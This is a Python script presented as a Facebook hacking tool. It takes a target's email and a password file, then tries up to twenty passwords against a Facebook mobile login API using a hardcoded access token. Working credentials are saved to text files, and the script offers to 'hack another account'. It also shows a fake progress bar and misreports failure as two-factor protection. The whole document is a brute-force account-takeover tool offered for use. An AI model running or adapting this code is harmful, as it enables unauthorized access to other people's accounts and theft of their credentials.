import os
import sys
import time
import json
import requests

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

internet = '''
\x1b[33;1m
     𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗨𝘀𝗲𝗿!
'''
banner = '''
\033[32m░𝗙░𝗕░ ░𝗛░𝗔░𝗖░𝗞░ ░𝗧░𝗢░𝗢░𝗟░ \033[0m
------------------------------------------
\033[36;1mCreated By\033[31;1m :\033[32;1m Lore Dave P. \033[32;1m[\033[37;1mL0R3X AI\033[32;1m]
------------------------------------------
'''

def fetch_facebook_data():
    try:
        print(internet)
        print('\033[37;1mFetching data files from facebook...')
        time.sleep(2)

        # Simulate progress bar for fetching data
        toolbar_width = 25
        sys.stdout.write('[')
        for _ in range(toolbar_width):
            sys.stdout.write('#')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write(']\n\n')

        # Check internet connection by making a request to Facebook
        response = requests.get('http://facebook.com')
        response.raise_for_status()  # Raise an exception for HTTP errors
        print('\033[37;1m\033[35;1m~> \033[32;1mSuccess ')
        time.sleep(2.0)
    except (ConnectionError, requests.exceptions.RequestException) as e:
        print('\033[37;1m]\033[35;1m ~>\033[31;1m No Connection')
        print(e)  # Print the error message
        sys.exit()

def start():
    try:
        os.system('clear')
        print(banner)
        email = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail \033[36;1m: \033[32;1m')
        passw_file = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Get Password \033[31;1m:\033[32;1m ')

        with open(passw_file, 'r') as file:
            passwords = file.readlines()[:20]

        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email)
        time.sleep(3.0)
        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mGenerated Data \033[36;1m:\033[32;1m ' + str(len(passwords)))
        time.sleep(3.0)
        print()

        # Print the password being used
        print('[=] Getting Password --> {}'.format(passwords[0].strip()))

        password_found = False
        for pw in passwords:
            pw = pw.strip()  # Remove leading/trailing whitespace and newline characters
            try:
                # Perform login attempt using the password
                response = requests.get(f'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={email}&locale=en_US&password={pw}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                data = response.json()

                if 'access_token' in data:
                    # Password found
                    with open('success.txt', 'w') as f:
                        f.write('[ID]=> ' + email + '\n')
                        f.write('[PW]=> ' + pw)
                    print('\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND')
                    print('\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email)
                    print('\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
                    print('\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCESS')
                    password_found = True
                    break  # Exit loop since we found the password
                elif 'error_msg' in data and 'www.facebook.com' in data['error_msg']:
                    # Password found but account is checkpointed
                    with open('successCP.txt', 'w') as f:
                        f.write('[ID]=> ' + email + '\n')
                        f.write('[PW]=> ' + pw)
                    print('\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND')
                    print('\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email)
                    print('\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
                    print('\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCESS')
                    password_found = True
                    break  # Exit loop since we found the password
            except (ConnectionError, requests.exceptions.RequestException) as e:
                print('\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mConnection timeout or error')
                print(e)  # Print the error message
                sys.exit()

        if not password_found:
            print("\n\n\033[33;1m[+] \033[37;1mPASSWORD NOT FOUND")
            print("\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m" + email)
            print("\033[33;1m[+] \033[37;1mPassword \033[32;1m: \033[35;1mnull")
            print("\033[33;1m[+] \033[37;1mStatus   \033[32;1m: \033[33;1mProtected by two-factor authentication")
            print("\033[33;1m[=] \033[37;1mProgram Finish")
            retrieve_another_account = input("Hack another account (Y/N): ")
            if retrieve_another_account.lower() == 'y':
                start()
            else:
                sys.exit()

    except IOError as e:
        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mError reading password file')
        print(e)  # Print the error message
        sys.exit()

def main():
    fetch_facebook_data()
    start()

if __name__ == "__main__":
    main()
